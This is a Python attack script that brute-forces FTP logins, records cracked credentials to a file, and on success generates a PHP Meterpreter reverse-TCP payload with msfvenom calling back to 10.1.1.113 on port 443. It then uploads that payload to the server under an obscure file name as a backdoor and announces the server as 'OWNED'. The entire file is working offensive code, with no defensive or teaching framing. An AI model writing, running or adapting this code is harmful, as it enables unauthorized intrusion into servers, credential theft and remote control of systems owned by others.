import ftplib
from ftplib import FTP
import os
import subprocess
from colorama import Fore # for fancy colors, nothing else

output = open('cracked.txt', 'a')
payload = 'xtrfhrjuyt56.php'
msfvenom_host = '10.1.1.113'
msfvenom_port = 443

def is_correct(u,password,host,port):
    # initialize the FTP server object
    server = ftplib.FTP()
    print(Fore.CYAN + "[*]" + Fore.RESET + " Trying " + Fore.YELLOW + u + Fore.RESET + ':' + Fore.YELLOW + password)
    try:
        # tries to connect to FTP server with a timeout of 5
        server.connect(host, port, timeout=10)
        # login using the credentials (user & password)
        server.login(u, password)
    except ftplib.error_perm:
        # login failed, wrong credentials
        return False
    except EOFError:
        print('EOF')
    except OSError:
        print(Fore.YELLOW + "[!]" + Fore.RESET + "Host: " + host + " not found")
    
    else:
        # correct credentials
        print(f"{Fore.WHITE}[+] Found Credentials " + u + ':' + password, Fore.RESET)
        output.write('[+] Bruteforced Account: ' + host + ' ' + u + ':' + password + '\n')
        
        print(f"{Fore.CYAN}[*]" + Fore.RESET + " Attempting to upload backdoor...",Fore.RESET)
        print(f"{Fore.CYAN}[*]" + Fore.RESET + " Generating New MSFVenom Payload...",Fore.RESET)
        subprocess.getoutput("msfvenom -p php/meterpreter_reverse_tcp lhost=" + msfvenom_host + " lport=" + str(msfvenom_port) + " -f raw -o " + payload)
        print(f"{Fore.CYAN}[*]" + Fore.RESET + " " + payload + " has been created",Fore.RESET)
        print(f"{Fore.CYAN}[*]" + Fore.RESET + " Uploading Backdoor...",Fore.RESET)
        try:
            ftp = FTP()
            ftp.connect(host=host,port=port,timeout=10)
            result = ftp.login(u,password)
            with open(payload, 'rb') as file:
                ftp.storbinary(f"STOR {payload}",file)
                output.write('[+] Backdoor Uploaded: ' + host + '/' + payload + '\n')
                print(f"{Fore.WHITE}[+] Backdoor Successfully Uploaded Listing Files:",Fore.RESET)
                ftp.retrlines("LIST")
                print(f"{Fore.YELLOW}[!]" + Fore.WHITE + " FTP Server OWNED",Fore.RESET)
        except ftplib.error_perm:
            print(Fore.RED + "[-] Upload Failed" + Fore.RESET)
            pass
        
        return True
